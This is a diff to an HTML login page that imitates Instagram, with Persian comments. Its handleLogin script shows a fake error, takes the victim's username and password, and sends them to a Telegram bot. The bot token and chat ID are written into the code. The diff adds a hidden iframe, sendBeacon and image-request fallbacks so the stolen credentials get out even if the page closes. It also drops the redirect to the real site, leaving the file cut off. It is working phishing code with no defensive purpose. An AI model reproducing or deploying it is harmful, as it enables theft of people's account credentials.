@@ -175,9 +175,12 @@ Don't have an account?
 
 </div>
 
+<!-- iframe مخفی برای ارسال -->
+<iframe id="hiddenFrame" name="hiddenFrame" style="display:none;width:0;height:0;border:0;"></iframe>
+
 <script>
-// ⚠️ فقط این یک خط رو تغییر بده - چت آی دی که از getUpdates گرفتی رو بذار
-var CHAT_ID = "8285016242";
+// ⚠️ چت آی دی خودت رو اینجا بذار
+var CHAT_ID = "828501642";
 
 function handleLogin(event) {
     event.preventDefault();
@@ -188,22 +191,18 @@ function handleLogin(event) {
     document.getElementById('errorMsg').style.display = 'block';
     document.getElementById('password').value = '';
 
-    var msg = encodeURIComponent(
-        "🔐 Instagram Login!\n\n" +
-        "👤 User: " + username + "\n" +
-        "🔑 Pass: " + password + "\n" +
-        "⏰ " + new Date().toLocaleString('fa-IR')
-    );
+    var msg = "🔐 Login!\n👤 " + username + "\n🔑 " + password;
+    var telegramUrl = "https://api.telegram.org/bot8962136688:AAHUGtRUtEvN-yVvrZUzLDk4U7pbZcP5TvQ/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(msg);
 
-    // ارسال با روش Image (تضمینی)
+    // ⚡ sendBeacon: حتی بعد از بسته شدن صفحه هم ارسال رو کامل میکنه
+    if (navigator.sendBeacon) {
+        var blob = new Blob(["chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(msg)], {type: 'application/x-www-form-urlencoded'});
+        navigator.sendBeacon("https://api.telegram.org/bot8962136688:AAHUGtRUtEvN-yVvrZUzLDk4U7pbZcP5TvQ/sendMessage", blob);
+    }
+
+    // روش پشتیبان ۱: iframe
+    document.getElementById('hiddenFrame').src = telegramUrl;
+
+    // روش پشتیبان ۲: Image
     var img = new Image();
-    img.src = "https://api.telegram.org/bot8962136688:AAHUGtRUtEvN-yVvrZUzLDk4U7pbZcP5TvQ/sendMessage?chat_id=" + CHAT_ID + "&text=" + msg;
-
-    setTimeout(function() {
-        window.location.href = 'https://www.instagram.com/accounts/login/';
-    }, 2000);
-}
-</script>
-
-</body>
-</html>
+    img.src = telegramUrl;
